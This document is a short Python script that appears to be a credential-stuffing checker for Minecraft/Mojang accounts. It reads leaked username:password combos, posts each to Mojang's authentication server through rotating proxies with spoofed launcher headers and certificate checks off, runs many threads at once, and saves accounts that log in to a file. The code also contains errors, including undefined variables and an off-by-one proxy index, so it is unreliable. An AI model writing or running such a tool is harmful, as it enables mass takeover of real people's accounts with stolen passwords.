import csv # For processing combos and proxies
import requests # For making web requests
import random # For choosing proxies at random
from multiprocessing import Pool # Multi-Threading
from multiprocessing import freeze_support # Windows Support


working = [] # Initialize the working accounts list

headers = { # Set HTTP Headers
    'Host': 'authserver.mojang.com',
    'Connection': 'close',
    'Accept': 'application/json, text/plain, */*',
    'Origin': 'mojang://launcher',
    'User-Agent': 'Minecraft Launcher/2.1.3674 (fafa322bd0) Windows (10.0; x86_64)',
    'Content-Type': 'application/json;charset=UTF-8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.8',
}

requests.packages.urllib3.disable_warnings() # Disable annoying HTTPS Warnings, not really needed for this application.


accounts = [line.rstrip('\n') for line in open("combo.txt", 'r')]
proxies = [line.rstrip('\n') for line in open("proxies.txt", 'r')]

def checkAccount(accountNumber):
    global working
    proxyNumber = random.randint(0,len(proxies)) # Get a random proxy from the proxy list
    data = '{"agent":{"name":"Minecraft","version":1},"username":"' + accounts[accountNumber].split(':')[0] +'","password":"' + accounts[accountNumber].split(':')[1] + '"}' # Set the data that will be sent to the auth servers to check
    response = requests.post('https://authserver.mojang.com/authenticate', proxies={"https": "http://" + proxies[proxyNumber]}, headers=headers, data=data, verify=False) # Send the data and assign the response to the variable response
    if ("accessToken" in response.text): # Check if the account is working.
          working.append(accounts[accountNumber].split(':')[0]+":"+password[accountNumber].split(':')[1])
          print(working)
          with open('working.txt', 'a') as f: # Open working .txt
                f.write("%s\n" % item) # Write account
    
def main():
    numThreads = input("How many threads would you like to use? ")
    freeze_support()
    numAccounts = range(len(accounts))

    pool = Pool(int(numThreads))
    pool.map(checkAccount, numAccounts)

    pool.close()
    pool.join()
if __name__ == "__main__":
    main()
